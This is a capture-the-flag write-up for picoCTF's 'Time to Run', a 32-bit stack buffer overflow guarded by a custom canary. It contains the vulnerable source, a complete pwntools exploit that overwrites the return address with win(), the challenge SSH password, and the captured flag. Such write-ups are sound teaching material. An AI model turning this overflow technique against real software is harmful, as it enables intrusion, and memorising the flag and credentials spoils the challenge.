# picoCTF - Time to Run

## Challenge Description
"It's a race against time. Solve the binary exploit ASAP."
Connecting to `dolphin-cove.picoctf.net:61936` provides SSH access with a limited environment.

## Initial Exploration
Upon connecting via SSH and exploring the directory, we find `instructions.txt` detailing the steps:
```
Hint:
- Run ./start to get a binary from the Code Bank
- You will get a C source file and a binary.
- Once the files are generated, you will have 80 seconds to exploit the binary.
- If the binary is exploited within the time limit, you will get the flag. Otherwise, the process has to be restarted.
```
Running `./start` outputs:
```
[+] Selected file: 9.c
[+] Copied 9.c to current directory.
[+] Compilation successful: 9
[+] Binary 9 has access to flag.txt
[*] Deletion scheduled: files will be removed in 80 seconds (even if this script exits).
```

Each run of `./start` generates a newly compiled 32-bit ELF binary with NX enabled, but ASLR disabled and PIE disabled. A custom `BUFSIZE` is randomized and defined in the `.c` file during every instantiation.

## Analysis of the Source Code
Let's analyze the `9.c` structure (which is similar across all variations but with a different `BUFSIZE`):
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE 182
#define CANARY_SIZE 4
#define FLAGSIZE 64

char global_canary[CANARY_SIZE];

void win() {
    char flag[FLAGSIZE];
    FILE *f = fopen("CodeBank/flag.txt", "r");
    // ...
    fgets(flag, FLAGSIZE, f);
    puts(flag);
}

void load_canary() {
    FILE *f = fopen("CodeBank/flag.txt", "r");
    // Reads first CANARY_SIZE bytes (4 bytes) of the flag.txt into global_canary
    fread(global_canary, 1, CANARY_SIZE, f);
    fclose(f);
}

void vuln() {
    char local_canary[CANARY_SIZE];
    char buf[BUFSIZE];
    char input[BUFSIZE];
    int count, i = 0;

    memcpy(local_canary, global_canary, CANARY_SIZE);

    printf("How many bytes?\n> ");
    // ... reads up to BUFSIZE into input and sscanf to count
    sscanf(input, "%d", &count);

    printf("Input> ");
    read(0, buf, count); // Vulnerable! Count can be larger than BUFSIZE.

    if (memcmp(local_canary, global_canary, CANARY_SIZE) != 0) {
        puts("***** Stack Smashing Detected *****");
        exit(0);
    }
    puts("Ok... Now Where's the flag?");
}
```
The vulnerability is a simple buffer overflow (`read(0, buf, count)`) with a custom stack canary mechanism. The canary is derived from the first 4 bytes of `flag.txt` (which for picoCTF is always `pico`).

The stack layout looks like:
```
[ buf (BUFSIZE) ]
[ local_canary (4 bytes) ]
[ padding to alignment (e.g. 12-32 bytes) ]
[ saved EBP ]
[ saved EIP ]
```

## Exploit Strategy
1. **Automate file retrieval:** Use `pwntools` over SSH to run `./start` and fetch the randomly selected `.c` file and its matching binary.
2. **Dynamic Information Gathering:** Parse `#define BUFSIZE (\d+)` from the source file to know exactly where the buffer ends.
3. **Canary Leak/Bruteforce:** We know the offset of `local_canary` is precisely at `BUFSIZE`. Although the canary is known to be `pico`, the script dynamically verifies it by overflowing into the canary byte-by-byte and checking if the program prints `***** Stack Smashing Detected *****`.
4. **Bruteforce EIP Offset:** After writing `BUFSIZE` bytes + `4` bytes of canary, there is an arbitrary padding of bytes before the Return Address (EIP) due to compiler stack alignment and other local variables like `count` and `i`. The padding length varies across different binaries, typically ranging between `12` and `32` bytes.
5. **Execution:** We iterate over potential paddings (in increments of 4) and overwrite EIP with the address of `win()`.

## Python Exploit Code
The successful python exploit `test_brute.py` implements the steps over SSH natively:

```python
from pwn import *
import re, sys, os, time

context.log_level = 'error'

def run():
    s = ssh(host='dolphin-cove.picoctf.net', user='ctf-player', port=61936, password='1ad5be0d')
    sh = s.process('./start')
    output = sh.recvall(timeout=5)

    m = re.search(b'Selected file: (.*?)\n', output)
    c_file = m.group(1).decode()
    bin_file = c_file[:-2]

    s.download(c_file, 'source_remote.c')
    s.download(bin_file, 'binary_remote')
    os.chmod('binary_remote', 0o755)
    return s, bin_file

s, bin_file = run()

with open('source_remote.c', 'r') as f:
    src = f.read()

bufsize = int(re.search(r'#define BUFSIZE (\d+)', src).group(1))
elf = ELF('./binary_remote')
win_addr = elf.symbols['win']

canary = b'pico'
canary_offset = bufsize

for eip_offset in range(12, 32, 4):
    p = s.process('./' + bin_file)
    p.recvuntil(b'> ')
    payload = b'A' * canary_offset + canary + b'B' * eip_offset + p32(win_addr)
    p.sendline(str(len(payload)).encode())
    p.recvuntil(b'Input> ')
    p.send(payload)
    output = p.recvall(timeout=1)
    p.close()
    if b'picoCTF{' in output:
        print(output.decode())
        break
```

Running the above yields the flag successfully within the 80 seconds timeframe constraint:
```
picoCTF{Y0U_AGa1n_Us3d_pwNt00L5_3181126a}
```
